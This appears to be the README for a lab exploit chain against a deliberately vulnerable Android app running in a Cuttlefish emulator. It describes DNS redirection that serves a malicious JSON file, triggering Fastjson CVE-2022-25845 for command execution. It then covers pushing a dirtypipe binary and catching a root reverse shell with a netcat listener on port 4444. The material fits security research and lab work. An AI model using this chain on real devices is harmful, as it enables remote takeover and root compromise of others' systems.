# Run Info

Start the server using python3 ./src/server.py
server.py will run a simple python server that will provide the ./src/app.json file required by the vulnerable app com.ds.viewimagejava

Assume cuttlefish instance is already running and ADB_PORT is known.

Identify the mtap interface of your instance. This can be gathered from
`ip addr` and finding the cvd-mtap-{instance_number}.

Replace {mtap-ip} and {ADB_PORT} in run_chain.sh with your cuttlefish instance values.

You also need to run two netcat listeners on your server. Both should be running simulateneously on seperate terminals before you use run_chain.sh

python3 tcp_file_server.py -p 3456 dirtypipe (this will upload the dirtypipe binary to your device)

nc -lvnp 4444 (this is for the reverse shell with root)

Run run_chain.sh
run_chain.sh will modify the DNS record for your cuttlefish instance so that the vulnerable app com.ds.viewimagejava connects to your python server when it attempts to connect to example.com
It will then run the vulnerable app which will download app.json from your server and trigger the exploit which uses CVE-2022-25845.
CVE-2022-25845 is a vulnerability in Alibabaâ€™s Fastjson library (versions before 1.2.83), caused by a bypass in the autoType check mechanism.
./src/app.json can be used to specify the cmd run using Runtime.getRuntime().exec(cmd) in the ErrorHandler class in the vulnerable app.
In order to get priviliged remote code execution we use dirtypipe exploit.
This requires you to have the dirtypipe binary crafted specifically for your ip and the vulnerable app.










